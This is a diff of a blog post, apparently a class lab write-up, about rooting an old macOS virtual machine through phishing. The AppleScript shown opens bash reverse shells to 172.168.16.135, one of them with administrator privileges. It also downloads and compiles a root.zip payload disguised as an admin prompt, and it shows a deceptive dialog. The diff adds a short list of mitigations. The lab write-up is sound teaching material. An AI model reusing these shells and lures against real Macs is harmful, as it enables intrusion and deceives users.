@@ -6,6 +6,8 @@ tags:
 - phishing
 - macos
 ---
+
+
 ## Introduction
 
 A few weeks ago I was given peculiar class assignment. I had to “root a Mac”. User interaction allowed. We were given an outdated Virtual Machine with OS X Tiger 10.7.5 installed, so I thought I’d be pretty easy. I was proven wrong very quickly, while doing some basic research.
@@ -57,9 +59,9 @@ tell application "HelpViewer"
 	quit
 end tell
 delay 1
-do shell script "/bin/bash -i &amp;amp;amp;gt;&amp;amp;amp;amp; /dev/tcp/172.168.16.135/443 0&amp;amp;amp;gt;&amp;amp;amp;amp;1 &amp;amp;amp;gt; /dev/null 2&amp;amp;amp;gt;&amp;amp;amp;amp;1 &amp;amp;amp;amp;"
+do shell script "/bin/bash -i &amp;amp;amp;amp;gt;&amp;amp;amp;amp;amp; /dev/tcp/172.168.16.135/443 0&amp;amp;amp;amp;gt;&amp;amp;amp;amp;amp;1 &amp;amp;amp;amp;gt; /dev/null 2&amp;amp;amp;amp;gt;&amp;amp;amp;amp;amp;1 &amp;amp;amp;amp;amp;"
 display dialog "Warning: Can't install fancy new App. OK go back to work!" buttons {"OK"} default button "OK"
-do shell script "curl http://172.168.16.135/root.zip &amp;amp;amp;gt; /tmp/root.zip &amp;amp;amp;amp;&amp;amp;amp;amp; cd /tmp &amp;amp;amp;amp;&amp;amp;amp;amp; unzip root.zip &amp;amp;amp;amp;&amp;amp;amp;amp; osacompile -o root.app root.txt &amp;amp;amp;amp;&amp;amp;amp;amp; mv applet.icns root.app/Contents/Resources/applet.icns"
+do shell script "curl http://172.168.16.135/root.zip &amp;amp;amp;amp;gt; /tmp/root.zip &amp;amp;amp;amp;amp;&amp;amp;amp;amp;amp; cd /tmp &amp;amp;amp;amp;amp;&amp;amp;amp;amp;amp; unzip root.zip &amp;amp;amp;amp;amp;&amp;amp;amp;amp;amp; osacompile -o root.app root.txt &amp;amp;amp;amp;amp;&amp;amp;amp;amp;amp; mv applet.icns root.app/Contents/Resources/applet.icns"
 repeat until application "System Preferences" is running
 	delay 2
 end repeat
@@ -71,7 +73,7 @@ When root.app gets executed it overlays a legitimate administrator app and asks 
 
 ```
 -- stage 2
-do shell script "/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/172.168.16.135/8080 0&amp;gt;&amp;amp;1 &amp;gt; /dev/null 2&amp;gt;&amp;amp;1 &amp;amp;" with administrator privileges
+do shell script "/bin/bash -i &amp;amp;gt;&amp;amp;amp; /dev/tcp/172.168.16.135/8080 0&amp;amp;gt;&amp;amp;amp;1 &amp;amp;gt; /dev/null 2&amp;amp;gt;&amp;amp;amp;1 &amp;amp;amp;" with administrator privileges
 delay 3
 display notification "https://www.apple.com" with title "got root" sound name "Ping"
 
@@ -79,4 +81,12 @@ display notification "https://www.apple.com" with title "got root" sound name "P
 
 ## Here we go...
 
-<iframe width="560" height="315" src="https://www.youtube-nocookie.com/embed/hk8Y3LYYXCk?rel=0&amp;showinfo=0" frameborder="0" allowfullscreen></iframe>
+<iframe width="560" height="315" src="https://www.youtube-nocookie.com/embed/hk8Y3LYYXCk?rel=0&amp;showinfo=0" frameborder="0" allowfullscreen=""></iframe>
+
+## Mitigations
+
+1. Keep your macos up to date.
+1. Don't disable Gatekeeper. If you need to, enable it afterwards.
+1. Don't use the administrator account for your daily work.
+1. Use [additional security software](https://www.objective-see.com/products.html).
+1. Don't click on stupid shit.
